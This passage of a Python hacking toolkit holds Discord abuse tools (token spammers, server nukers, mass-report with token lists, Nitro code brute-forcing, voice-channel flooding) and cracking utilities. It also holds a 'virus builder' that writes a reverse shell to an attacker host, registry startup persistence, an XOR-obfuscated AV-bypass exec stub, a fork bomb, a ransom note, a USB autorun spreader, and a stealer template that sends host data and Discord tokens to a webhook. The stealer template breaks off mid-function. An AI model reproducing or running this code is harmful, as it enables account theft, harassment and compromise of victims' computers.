    toks = []
    for _ in range(n):
        p1 = base64.b64encode(str(random.randint(10**17, 10**18)).encode()).decode().rstrip("=")
        p2 = "".join(random.choices(chars, k=6))
        p3 = "".join(random.choices(chars, k=27))
        t = f"{p1}.{p2}.{p3}"
        print(f"  {Y}{t}{RST}"); toks.append(t)
    out("tokens_gen.txt", "\n".join(toks)); pause()


def dc_wh_info():
    banner_s("WEBHOOK INFO")
    wh = ask("Webhook URL:")
    print(); pkv(jget(wh)); pause()


def dc_wh_del():
    banner_s("WEBHOOK DELETE")
    wh = ask("Webhook URL:")
    r = requests.delete(wh)
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); pause()


def dc_wh_spam():
    banner_s("WEBHOOK SPAMMER")
    wh = ask("Webhook:"); m = ask("Message:"); n = ask_int("Count:", 10)
    for i in range(1, n + 1):
        r = requests.post(wh, json={"content": m})
        print(f"  {G if r.status_code == 204 else R}[{i}/{n}]{RST}")
        time.sleep(0.5)
    pause()


def dc_wh_gen():
    banner_s("WEBHOOK GENERATOR")
    t = ask("Token:"); ch = ask("Channel ID:"); nm = ask("Name:", "leakfr"); n = ask_int("Count:", 3)
    h = _dh(t); hooks = []
    for i in range(n):
        r = requests.post(f"https://discord.com/api/v9/channels/{ch}/webhooks",
                          headers=h, json={"name": f"{nm}-{i}"})
        if r.status_code == 200:
            url = r.json().get("url"); print(f"  {G}[OK]{RST} {url}"); hooks.append(url)
        time.sleep(0.4)
    if hooks: out("webhooks_created.txt", "\n".join(hooks))
    pause()


def dc_bot_nuke():
    banner_s("BOT SERVER NUKER")
    t = ask("Bot Token:"); g = ask("Server ID:")
    if ask("Type NUKE:") != "NUKE": pause(); return
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    chs = requests.get(f"https://discord.com/api/v9/guilds/{g}/channels", headers=h).json()
    if isinstance(chs, list):
        for c in chs:
            requests.delete(f"https://discord.com/api/v9/channels/{c['id']}", headers=h)
            print(f"  {R}[DEL]{RST} {c['name']}"); time.sleep(0.3)
    pause()


def dc_srv_info():
    banner_s("SERVER INFO")
    t = ask("Token:"); g = ask("Server ID:")
    d = requests.get(f"https://discord.com/api/v9/guilds/{g}?with_counts=true", headers=_dh(t)).json()
    for k in ["name", "owner_id", "approximate_member_count", "approximate_presence_count",
              "premium_tier", "premium_subscription_count"]:
        print(f"  {Y}{k:<26}{RST} {W}{d.get(k)}{RST}")
    pause()


def dc_nitro():
    banner_s("NITRO GENERATOR")
    n = ask_int("Count:", 10); check = ask("Check? (y/n):", "n").lower() == "y"
    chars = string.ascii_letters + string.digits
    valid = []
    for i in range(1, n + 1):
        code = "".join(random.choices(chars, k=16)); url = f"https://discord.gift/{code}"
        if check:
            r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", timeout=4)
            ok = r.status_code == 200
            print(f"  {G if ok else R}[{'VALID' if ok else 'INVALID'}]{RST} {url}")
            if ok: valid.append(url)
        else:
            print(f"  {Y}{url}{RST}"); valid.append(url)
        time.sleep(0.15)
    if valid: out("nitro_gen.txt", "\n".join(valid))
    pause()


def dc_fr_spam():
    banner_s("FRIEND SPAMMER")
    t = ask("Token:"); m = ask("Message:"); h = _dh(t)
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if isinstance(fs, list):
        for f in fs:
            if f.get("type") == 1:
                dm = requests.post("https://discord.com/api/v9/users/@me/channels",
                                   headers=h, json={"recipient_id": f['user']['id']})
                if dm.status_code == 200:
                    requests.post(f"https://discord.com/api/v9/channels/{dm.json()['id']}/messages",
                                  headers=h, json={"content": m})
                    print(f"  {G}[DM]{RST} {f['user']['username']}")
                time.sleep(0.6)
    pause()


def dc_ch_spam():
    banner_s("CHANNEL SPAMMER")
    t = ask("Token:"); ch = ask("Channel ID:")
    m = ask("Message:", "@everyone leak-fr"); n = ask_int("Count:", 20)
    h = _dh(t)
    for i in range(1, n + 1):
        r = requests.post(f"https://discord.com/api/v9/channels/{ch}/messages",
                          headers=h, json={"content": m})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST}")
        time.sleep(0.3)
    pause()


def dc_rx_spam():
    banner_s("REACTION SPAMMER")
    t = ask("Token:"); ch = ask("Channel ID:"); mid = ask("Message ID:")
    em = ask("Emoji:"); n = ask_int("Count:", 10)
    enc = urllib.parse.quote(em); h = _dh(t)
    for i in range(1, n + 1):
        r = requests.put(f"https://discord.com/api/v9/channels/{ch}/messages/{mid}/reactions/{enc}/@me", headers=h)
        print(f"  {G if r.status_code == 204 else R}[{i}/{n}]{RST}")
        time.sleep(0.3)
    pause()


def dc_guilds():
    banner_s("GUILD LIST")
    t = ask("Token:")
    r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t)).json()
    if isinstance(r, list):
        for g in r:
            tag = f"{G}[OWN]{RST}" if g.get("owner") else f"{DIM}[MBR]{RST}"
            print(f"  {tag} {g['name']:<28} {DIM}{g['id']}{RST}")
    pause()


def dc_friends():
    banner_s("FRIEND LIST")
    t = ask("Token:")
    r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(t)).json()
    if isinstance(r, list):
        for f in r:
            u = f.get("user", {})
            print(f"  {G}[{f.get('type')}]{RST} {u.get('username')} {DIM}{u.get('id')}{RST}")
    pause()


def dc_bio():
    banner_s("BIO CHANGER")
    t = ask("Token:"); b = ask("Bio:")
    r = requests.patch("https://discord.com/api/v9/users/@me", headers=_dh(t), json={"bio": b})
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); pause()


def dc_avatar():
    banner_s("AVATAR CHANGER")
    t = ask("Token:"); p = ask("Image path:")
    try:
        with open(p, "rb") as f: data = f.read()
        ext = os.path.splitext(p)[1].lower().replace(".", "") or "png"
        b64 = base64.b64encode(data).decode()
        r = requests.patch("https://discord.com/api/v9/users/@me", headers=_dh(t),
                           json={"avatar": f"data:image/{ext};base64,{b64}"})
        print(f"{OK if r.status_code == 200 else ERR} {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def dc_banner():
    banner_s("BANNER CHANGER")
    t = ask("Token:"); p = ask("Image path:")
    try:
        with open(p, "rb") as f: data = f.read()
        ext = os.path.splitext(p)[1].lower().replace(".", "") or "png"
        b64 = base64.b64encode(data).decode()
        r = requests.patch("https://discord.com/api/v9/users/@me", headers=_dh(t),
                           json={"banner": f"data:image/{ext};base64,{b64}"})
        print(f"{OK if r.status_code == 200 else ERR} {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def dc_hs():
    banner_s("HYPESQUAD")
    t = ask("Token:")
    h = ask("[1]Bravery [2]Brilliance [3]Balance:", "1")
    r = requests.post("https://discord.com/api/v9/hypesquad/online",
                      headers=_dh(t), json={"house_id": int(h)})
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); pause()


def dc_online():
    banner_s("TOKEN ONLINER")
    t = ask("Token:"); d = ask_int("Duration (0=inf):", 0)
    h = _dh(t); start = time.time(); c = 0
    print(f"\n{INF} Ctrl+C pour stopper.\n")
    try:
        while True:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5)
            c += 1; el = int(time.time() - start)
            print(f"\r  {G}[ONLINE]{RST} ping #{c} {el}s", end=" ")
            if d > 0 and el >= d: break
            time.sleep(30)
    except KeyboardInterrupt: pass
    print(f"\n\n{OK} {c} pings."); pause()


def dc_t2id():
    banner_s("TOKEN → ID")
    t = ask("Token:")
    try:
        p1 = t.split(".")[0]; p1 += "=" * ((4 - len(p1) % 4) % 4)
        uid = base64.b64decode(p1).decode()
        print(f"\n  {Y}User ID{RST}: {G}{uid}{RST}")
        ts = (int(uid) >> 22) + 1420070400000
        print(f"  {Y}Created{RST}: {datetime.fromtimestamp(ts / 1000)}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def dc_report():
    banner_s("MASS REPORT")
    fp = ask("Fichier tokens .txt:")
    if not os.path.isfile(fp): print(f"{ERR} Introuvable."); pause(); return
    tid = ask("User ID:")
    tokens = [l.strip() for l in open(fp, errors="ignore") if l.strip()]
    s = 0
    for tk in tokens:
        try:
            r = requests.post(f"https://discord.com/api/v9/reporting/user/{tid}",
                              headers=_dh(tk), json={"version": "1.0", "variant": "1",
                                                     "language": "fr", "breadcrumbs": [0],
                                                     "elements": {}, "name": "human_profile"},
                              timeout=5)
            if r.status_code in [200, 201, 204]: s += 1
            print(f"  {G if r.status_code in [200,201,204] else R}[{r.status_code}]{RST}")
        except Exception: pass
        time.sleep(0.5)
    print(f"\n{OK} {s}/{len(tokens)} sent."); pause()


def discord_menu():
    while True:
        menu_box("DISCORD ALL-IN-ONE", [
            ("1", "Token Info"), ("2", "Token Nuker"),
            ("3", "Token Spammer"), ("4", "Token Joiner"),
            ("5", "Token Leaver"), ("6", "Status Changer"),
            ("7", "Delete Friends"), ("8", "Block Friends"),
            ("9", "Mass DM"), ("10", "Delete DMs"),
            ("11", "Server Raid"), ("12", "Token Generator"),
            ("13", "Webhook Info"), ("14", "Webhook Delete"),
            ("15", "Webhook Spammer"), ("16", "Webhook Generator"),
            ("17", "Bot Server Nuker"), ("18", "Server Info"),
            ("19", "Nitro Generator"), ("20", "Friend Spammer"),
            ("21", "Channel Spammer"), ("22", "Reaction Spammer"),
            ("23", "Guild List"), ("24", "Friend List"),
            ("25", "Bio Changer"), ("26", "Avatar Changer"),
            ("27", "Banner Changer"), ("28", "HypeSquad"),
            ("29", "Token Onliner"), ("30", "Token → ID"),
            ("31", "Mass Report"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": dc_info()
        elif c == "2": dc_nuker()
        elif c == "3": dc_spam()
        elif c == "4": dc_join()
        elif c == "5": dc_leave()
        elif c == "6": dc_status()
        elif c == "7": dc_delf()
        elif c == "8": dc_blockf()
        elif c == "9": dc_mass_dm()
        elif c == "10": dc_del_dm()
        elif c == "11": dc_raid()
        elif c == "12": dc_tokgen()
        elif c == "13": dc_wh_info()
        elif c == "14": dc_wh_del()
        elif c == "15": dc_wh_spam()
        elif c == "16": dc_wh_gen()
        elif c == "17": dc_bot_nuke()
        elif c == "18": dc_srv_info()
        elif c == "19": dc_nitro()
        elif c == "20": dc_fr_spam()
        elif c == "21": dc_ch_spam()
        elif c == "22": dc_rx_spam()
        elif c == "23": dc_guilds()
        elif c == "24": dc_friends()
        elif c == "25": dc_bio()
        elif c == "26": dc_avatar()
        elif c == "27": dc_banner()
        elif c == "28": dc_hs()
        elif c == "29": dc_online()
        elif c == "30": dc_t2id()
        elif c == "31": dc_report()
        elif c == "0": break

      # ========================================================================
# VC DISCORD
# ========================================================================
def _vc_join(t, g, c, hold=3):
    try: import websocket
    except ImportError: _pip("websocket-client"); import websocket
    try:
        ws = websocket.create_connection("wss://gateway.discord.gg/?v=9&encoding=json", timeout=10)
    except Exception as e: return False, str(e)
    hb = 45.0
    try:
        h = json.loads(ws.recv()); hb = h["d"]["heartbeat_interval"] / 1000
    except Exception: pass
    stop = {"v": False}
    def hf():
        while not stop["v"]:
            try: ws.send(json.dumps({"op": 1, "d": None}))
            except Exception: return
            time.sleep(hb)
    threading.Thread(target=hf, daemon=True).start()
    try:
        ws.send(json.dumps({"op": 2, "d": {"token": t,
            "properties": {"$os": "Windows", "$browser": "Chrome", "$device": "PC"},
            "compress": False}}))
        for _ in range(30):
            try:
                ev = json.loads(ws.recv())
                if ev.get("t") == "READY": break
            except Exception: break
        ws.send(json.dumps({"op": 4, "d": {"guild_id": g, "channel_id": c,
            "self_mute": False, "self_deaf": False}}))
        time.sleep(hold)
        ws.send(json.dumps({"op": 4, "d": {"guild_id": g, "channel_id": None,
            "self_mute": False, "self_deaf": False}}))
        time.sleep(0.5); stop["v"] = True; ws.close()
        return True, "ok"
    except Exception as e:
        stop["v"] = True
        try: ws.close()
        except Exception: pass
        return False, str(e)


def vc_join():
    banner_s("VC JOINER")
    ok_, msg = _vc_join(ask("Token:"), ask("Server ID:"), ask("Channel ID:"), 5)
    print(f"{OK if ok_ else ERR} {msg}"); pause()


def vc_spam():
    banner_s("VC SPAMMER")
    t = ask("Token:"); g = ask("Server ID:"); c = ask("Channel ID:")
    n = ask_int("Count:", 10); d = float(ask("Delay:", "1"))
    for i in range(1, n + 1):
        ok_, _ = _vc_join(t, g, c, max(0.5, d))
        print(f"  {G if ok_ else R}[{i}/{n}]{RST}"); time.sleep(d)
    pause()


def vc_mass():
    banner_s("VC MASS JOINER")
    p = ask("Fichier tokens .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    tks = [l.strip() for l in open(p, errors="ignore") if l.strip()]
    g = ask("Server ID:"); c = ask("Channel ID:")
    for i, t in enumerate(tks, 1):
        ok_, _ = _vc_join(t, g, c, 2)
        print(f"  {G if ok_ else R}[{i}/{len(tks)}]{RST}")
    pause()


def vc_list():
    banner_s("VC LISTER")
    t = ask("Token:"); g = ask("Server ID:")
    chs = requests.get(f"https://discord.com/api/v9/guilds/{g}/channels", headers=_dh(t)).json()
    if isinstance(chs, list):
        for c in chs:
            if c.get("type") in [2, 13]:
                print(f"  {G}[VC]{RST} {c['name']:<25} {DIM}{c['id']}{RST}")
    pause()


def vc_mute():
    banner_s("MUTE/DEAFEN ALL")
    t = ask("Bot Token:"); g = ask("Server ID:"); a = ask("[1]M [2]D [3]Both:", "1")
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    ms = requests.get(f"https://discord.com/api/v9/guilds/{g}/members?limit=1000", headers=h).json()
    if isinstance(ms, list):
        for m in ms:
            uid = m["user"]["id"]; p = {}
            if a in ["1", "3"]: p["mute"] = True
            if a in ["2", "3"]: p["deaf"] = True
            requests.patch(f"https://discord.com/api/v9/guilds/{g}/members/{uid}", headers=h, json=p)
            print(f"  {G}[OK]{RST} {m['user']['username']}"); time.sleep(0.2)
    pause()


def vc_discon():
    banner_s("DISCONNECT ALL")
    t = ask("Bot Token:"); g = ask("Server ID:")
    if ask("Type DISCONNECT:") != "DISCONNECT": pause(); return
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    ms = requests.get(f"https://discord.com/api/v9/guilds/{g}/members?limit=1000", headers=h).json()
    if isinstance(ms, list):
        for m in ms:
            requests.patch(f"https://discord.com/api/v9/guilds/{g}/members/{m['user']['id']}",
                           headers=h, json={"channel_id": None})
            print(f"  {G}[KICK]{RST} {m['user']['username']}"); time.sleep(0.15)
    pause()


def vc_move():
    banner_s("MOVE ALL USERS")
    t = ask("Bot Token:"); g = ask("Server ID:"); d = ask("Dest channel ID:")
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    ms = requests.get(f"https://discord.com/api/v9/guilds/{g}/members?limit=1000", headers=h).json()
    if isinstance(ms, list):
        for m in ms:
            requests.patch(f"https://discord.com/api/v9/guilds/{g}/members/{m['user']['id']}",
                           headers=h, json={"channel_id": d})
            print(f"  {G}[MOVE]{RST} {m['user']['username']}"); time.sleep(0.15)
    pause()


def vc_flood():
    banner_s("VC FLOOD")
    t = ask("Token:"); g = ask("Server ID:"); n = ask_int("Count:", 10)
    bot = ask("Bot token? (y/n):", "n").lower() == "y"
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"} if bot else _dh(t)
    for i in range(1, n + 1):
        r = requests.post(f"https://discord.com/api/v9/guilds/{g}/channels",
                          headers=h, json={"name": f"leakfr-{i}", "type": 2, "bitrate": 64000})
        print(f"  {G if r.status_code == 201 else R}[{i}/{n}]{RST} {r.status_code}")
        time.sleep(0.3)
    pause()


def vc_share():
    banner_s("VC SCREENSHARE")
    ok_, msg = _vc_join(ask("Token:"), ask("Server ID:"), ask("Channel ID:"), 5)
    print(f"{OK if ok_ else ERR} {msg}"); pause()


def vc_menu():
    while True:
        menu_box("VC DISCORD TOOLS", [
            ("1", "VC Joiner"), ("2", "VC Spammer"),
            ("3", "VC Mass Joiner"), ("4", "VC Channel Lister"),
            ("5", "Mute/Deafen All"), ("6", "Disconnect All"),
            ("7", "Move All Users"), ("8", "VC Flood"),
            ("9", "VC Screenshare"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": vc_join()
        elif c == "2": vc_spam()
        elif c == "3": vc_mass()
        elif c == "4": vc_list()
        elif c == "5": vc_mute()
        elif c == "6": vc_discon()
        elif c == "7": vc_move()
        elif c == "8": vc_flood()
        elif c == "9": vc_share()
        elif c == "0": break


# ========================================================================
# UTILITIES
# ========================================================================
def u_hash():
    banner_s("HASHER")
    t = ask("Text:")
    for a in ["md5", "sha1", "sha256", "sha512"]:
        print(f"  {Y}{a:<8}{RST} {hashlib.new(a, t.encode()).hexdigest()}")
    pause()


def u_pass():
    banner_s("PASSWORD GEN")
    l = ask_int("Length:", 16); n = ask_int("Count:", 10)
    pool = string.ascii_letters + string.digits + "!@#$%^&*"
    for _ in range(n): print(f"  {G}->{RST} {W}{''.join(random.choices(pool, k=l))}{RST}")
    pause()


def u_ip():
    banner_s("IP GEN")
    for _ in range(ask_int("Count:", 10)):
        print(f"  {G}->{RST} {'.'.join(str(random.randint(1,254)) for _ in range(4))}")
    pause()


def u_b64():
    banner_s("BASE64")
    m = ask("(e)ncode/(d)ecode:", "e"); t = ask("Input:")
    try:
        if m == "e": print(f"\n{OK} {G}{base64.b64encode(t.encode()).decode()}{RST}")
        else: print(f"\n{OK} {G}{base64.b64decode(t).decode()}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def u_xor():
    banner_s("XOR")
    t = ask("Text:"); k = ask("Key:")
    if not k: pause(); return
    o = "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(t))
    print(f"\n{OK} {G}{base64.b64encode(o.encode('latin-1')).decode()}{RST}"); pause()


def u_fake():
    banner_s("FAKE IDENTITY")
    fm = ["James", "Michael", "David", "Alex", "Ryan"]
    ff = ["Emma", "Olivia", "Sophia", "Ava", "Isabella"]
    ln = random.choice(["Smith", "Johnson", "Williams", "Brown", "Davis"])
    fn = random.choice(fm if random.choice(["M", "F"]) == "M" else ff)
    print(f"\n  {Y}Name {RST}: {fn} {ln}")
    print(f"  {Y}Email{RST}: {fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com")
    print(f"  {Y}Phone{RST}: +1{random.randint(200,999)}{random.randint(1000000,9999999)}")
    print(f"  {Y}DOB  {RST}: {random.randint(1985,2004)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}")
    print(f"  {Y}SSN  {RST}: {random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}")
    print(f"  {Y}CC   {RST}: 4{random.randint(100000000000000,999999999999999)}")
    pause()


def u_crack():
    banner_s("HASH CRACK")
    target = ask("Hash:").lower()
    for w in ["password", "123456", "admin", "qwerty", "letmein", "welcome", "monkey",
              "abc123", "1234", "iloveyou", "sunshine"]:
        for a in ["md5", "sha1", "sha256"]:
            if hashlib.new(a, w.encode()).hexdigest() == target:
                print(f"\n{OK} {G}{w}{RST} ({a})"); pause(); return
    print(f"{ERR} Not found."); pause()


def u_dark():
    banner_s("DARK WEB LINKS")
    for n, u in [("Torch", "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion"),
                 ("Ahmia", "https://ahmia.fi/"),
                 ("Hidden Wiki", "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion"),
                 ("DuckDuckGo Tor", "https://3g2upl4pq6kufc4m.onion")]:
        print(f"  {G}{n:<16}{RST} {DIM}{u}{RST}")
    pause()


def u_uuid():
    banner_s("UUID GEN")
    import uuid
    for i in range(ask_int("Count:", 10)):
        print(f"  {G}[{i+1}]{RST} {uuid.uuid4()}")
    pause()


def u_mac():
    banner_s("MAC GEN")
    for _ in range(ask_int("Count:", 10)):
        print(f"  {G}->{RST} {':'.join(f'{random.randint(0,255):02x}' for _ in range(6))}")
    pause()


def u_jwt():
    banner_s("JWT DECODER")
    t = ask("JWT:")
    p = t.split(".")
    if len(p) != 3: print(f"{ERR} Invalide."); pause(); return
    try:
        def dp(x):
            x += "=" * ((4 - len(x) % 4) % 4)
            return json.loads(base64.b64decode(x).decode())
        print(f"\n  {Y}HEADER{RST}:"); pkv(dp(p[0]), 1)
        print(f"\n  {Y}PAYLOAD{RST}:"); pkv(dp(p[1]), 1)
    except Exception as e: print(f"{ERR} {e}")
    pause()


def u_conv():
    banner_s("TEXT CONVERTER")
    m = ask("[1]T->B [2]T->H [3]B->T [4]H->T:", "1"); t = ask("Input:")
    try:
        if m == "1": o = " ".join(format(ord(c), "08b") for c in t)
        elif m == "2": o = " ".join(format(ord(c), "02x") for c in t)
        elif m == "3": o = "".join(chr(int(b, 2)) for b in t.split())
        elif m == "4": o = bytes.fromhex(t.replace(" ", "")).decode()
        else: o = "Invalid"
        print(f"\n{OK} {G}{o}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def u_dbs():
    banner_s("DB SEARCH")
    q = ask("Query:")
    for n, u in [("HIBP", f"https://haveibeenpwned.com/account/{q}"),
                 ("Dehashed", f"https://dehashed.com/search?query={q}"),
                 ("LeakCheck", f"https://leakcheck.io/?query={q}"),
                 ("IntelX", f"https://intelx.io/?s={q}"),
                 ("Snusbase", "https://snusbase.com/")]:
        print(f"  {G}[{n}]{RST} {DIM}{u}{RST}")
    pause()


def u_caesar():
    banner_s("CAESAR CIPHER")
    t = ask("Text:"); s = ask_int("Shift:", 13)
    m = ask("(e)/(d):", "e")
    if m == "d": s = -s
    r = "".join(chr((ord(c) - ord('A' if c.isupper() else 'a') + s) % 26 + ord('A' if c.isupper() else 'a')) if c.isalpha() else c for c in t)
    print(f"\n{OK} {G}{r}{RST}"); pause()


def u_zip():
    banner_s("ZIP CRACK")
    zp = ask("ZIP path:")
    if not os.path.isfile(zp): print(f"{ERR} Introuvable."); pause(); return
    import zipfile
    for w in ["password", "123456", "admin", "qwerty", "letmein", "welcome", "1234"]:
        try:
            zipfile.ZipFile(zp).extractall(pwd=w.encode())
            print(f"\n{OK} {G}{w}{RST}"); pause(); return
        except Exception: pass
    print(f"{ERR} Not found."); pause()


def u_proxy():
    banner_s("PROXY GENERATOR")
    n = ask_int("Count:", 20)
    proxies = []
    for _ in range(n):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        port = random.choice([80, 8080, 3128, 1080, 8888, 443])
        p = f"{ip}:{port}"; print(f"  {G}->{RST} {p}"); proxies.append(p)
    out("proxies_gen.txt", "\n".join(proxies))
    pause()


def util_menu():
    while True:
        menu_box("UTILITIES", [
            ("1", "Password Hasher"), ("2", "Password Generator"),
            ("3", "IP Generator"), ("4", "Base64"),
            ("5", "XOR"), ("6", "Fake Identity"),
            ("7", "Hash Cracker"), ("8", "Dark Web Links"),
            ("9", "UUID Gen"), ("10", "MAC Gen"),
            ("11", "JWT Decoder"), ("12", "Text Converter"),
            ("13", "Database Search"), ("14", "Caesar Cipher"),
            ("15", "Zip Crack"), ("16", "Proxy Generator"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": u_hash()
        elif c == "2": u_pass()
        elif c == "3": u_ip()
        elif c == "4": u_b64()
        elif c == "5": u_xor()
        elif c == "6": u_fake()
        elif c == "7": u_crack()
        elif c == "8": u_dark()
        elif c == "9": u_uuid()
        elif c == "10": u_mac()
        elif c == "11": u_jwt()
        elif c == "12": u_conv()
        elif c == "13": u_dbs()
        elif c == "14": u_caesar()
        elif c == "15": u_zip()
        elif c == "16": u_proxy()
        elif c == "0": break


# ========================================================================
# VIRUS BUILDER
# ========================================================================
def _write(name, content):
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(content)
    print(f"\n{OK} -> {Y}{p}{RST}"); pause()


def b_stealer():
    banner_s("FULL STEALER")
    wh = ask("Webhook:"); name = ask("Output:", "stealer.py")
    code = _STEALER_TPL.replace("__WH__", wh)
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(code)
    print(f"\n{OK} -> {Y}{p}{RST}"); _ask_exe(p); pause()


def b_malware():
    banner_s("MALWARE BUILDER")
    _write("block_key.py", _BLOCK_KEY)


def b_mouse():
    banner_s("BLOCK MOUSE")
    _write("block_mouse.py", _BLOCK_MOUSE)


def b_taskmgr():
    banner_s("BLOCK TASKMGR")
    _write("block_taskmgr.py", _BLOCK_TM)


def b_blockav():
    banner_s("BLOCK AV SITES")
    _write("block_av.py", _BLOCK_AV)


def b_shutdown():
    banner_s("SHUTDOWN")
    _write("shutdown.py", "import os\nos.system('shutdown /s /t 0')\n")


def b_antivm():
    banner_s("ANTI VM")
    _write("anti_vm.py", _ANTIVM)


def b_restart():
    banner_s("RESTART LOOP")
    _write("restart.py", "import os,time\nwhile True:\n    time.sleep(300)\n    os.system('shutdown /r /t 0')\n")


def b_fake():
    banner_s("FAKE ERROR")
    ti = ask("Title:", "System Error"); ms = ask("Message:", "Critical error.")
    _write("fake_error.py", f'import ctypes\nctypes.windll.user32.MessageBoxW(0, "{ms}", "{ti}", 0x10)\n')


def b_startup():
    banner_s("STARTUP PERSISTENCE")
    s = ask("Script path:")
    code = ('import os, shutil, winreg\n'
            f'SCRIPT = r"{s}"\n'
            'SU = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")\n'
            'shutil.copy2(SCRIPT, SU)\n'
            'k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)\n'
            f'winreg.SetValueEx(k, "leakfr", 0, winreg.REG_SZ, "python \\"{s}\\"")\n'
            'winreg.CloseKey(k)\n')
    _write("startup.py", code)


def b_fork():
    banner_s("FORK BOMB")
    _write("forkbomb.bat", ":loop\nstart %0\ngoto loop\n")


def b_rev():
    banner_s("REVERSE SHELL")
    h = ask("LHOST:"); p = ask("LPORT:", "4444")
    code = f'import socket, subprocess\ns = socket.socket()\ns.connect(("{h}", {p}))\nwhile True:\n    c = s.recv(1024).decode()\n    if not c: continue\n    o = subprocess.run(c, shell=True, capture_output=True)\n    s.send(o.stdout + o.stderr)\n'
    _write("revshell.py", code)


def b_av():
    banner_s("AV BYPASS STUB")
    pl = ask("Payload .py:")
    if not os.path.isfile(pl): print(f"{ERR} Introuvable."); pause(); return
    src = open(pl, encoding="utf-8", errors="ignore").read()
    k = random.randint(1, 254)
    ex = base64.b64encode(bytes(b ^ k for b in src.encode())).decode()
    stub = f'import base64\n_k={k}\n_d=base64.b64decode("{ex}")\nexec(bytes(b^_k for b in _d).decode())\n'
    _write("stub.py", stub)


def b_ransom():
    banner_s("RANSOM NOTE")
    uid = hashlib.md5(os.urandom(16)).hexdigest().upper()
    _write("README_DECRYPT.txt", f"Files encrypted. Pay 0.05 BTC.\nID: {uid}\n")


def b_usb():
    banner_s("USB SPREADER")
    p = ask("Payload:", "stealer.py")
    code = ('import os, shutil, string\n'
            f'PAYLOAD = r"{p}"\n'
            'for d in string.ascii_uppercase:\n'
            '    drv = f"{d}:\\\\"\n'
            '    if os.path.exists(drv):\n'
            '        try:\n'
            '            shutil.copy2(PAYLOAD, drv)\n'
            '            open(drv + "autorun.inf", "w").write("[AutoRun]\\nopen=python ' + p + '\\n")\n'
            '        except: pass\n')
    _write("usb_spreader.py", code)


def _ask_exe(path):
    if ask("Compile .exe? (y/n):", "n").lower() != "y": return
    subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "--quiet"], check=False)
    r = subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                        "--distpath", "1-Output", "--workpath", "1-Output/build",
                        "--specpath", "1-Output/build", path], capture_output=True, text=True)
    print(f"{OK if r.returncode == 0 else ERR} build")


def builder_menu():
    while True:
        menu_box("VIRUS BUILDER", [
            ("1", "Full Stealer"), ("2", "Block Key"),
            ("3", "Block Mouse"), ("4", "Block TaskMgr"),
            ("5", "Block AV Sites"), ("6", "Shutdown"),
            ("7", "Anti VM"), ("8", "Restart Loop"),
            ("9", "Fake Error"), ("10", "Startup Persistence"),
            ("11", "Fork Bomb"), ("12", "Reverse Shell"),
            ("13", "AV Bypass Stub"), ("14", "Ransomware Note"),
            ("15", "USB Spreader"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": b_stealer()
        elif c == "2": b_malware()
        elif c == "3": b_mouse()
        elif c == "4": b_taskmgr()
        elif c == "5": b_blockav()
        elif c == "6": b_shutdown()
        elif c == "7": b_antivm()
        elif c == "8": b_restart()
        elif c == "9": b_fake()
        elif c == "10": b_startup()
        elif c == "11": b_fork()
        elif c == "12": b_rev()
        elif c == "13": b_av()
        elif c == "14": b_ransom()
        elif c == "15": b_usb()
        elif c == "0": break


_STEALER_TPL = '''# -*- coding: utf-8 -*-
import os, json, sqlite3, shutil, platform, socket, subprocess, re
from datetime import datetime
WH = "__WH__"
try: import requests
except Exception:
    import subprocess as sp; sp.run(["pip", "install", "requests", "--quiet"]); import requests
def send(c="", e=None, f=None):
    try:
        d = {"content": c}
        if e: d["embeds"] = e
        if f: requests.post(WH, data=d, files=f, timeout=10)
        else: requests.post(WH, json=d, timeout=10)
    except: pass
def info():
    try: ip = requests.get("https://api.ipify.org", timeout=4).text.strip()
    except: ip = "?"
    try: u = os.getlogin()
    except: u = "?"
    return {"host": socket.gethostname(), "user": u, "ip": ip,
            "os": platform.platform(), "t": str(datetime.now())[:19]}
def tokens():
    ad = os.environ.get("APPDATA", ""); lo = os.environ.get("LOCALAPPDATA", "")
    ps = [os.path.join(ad, "Discord", "Local Storage", "leveldb"),
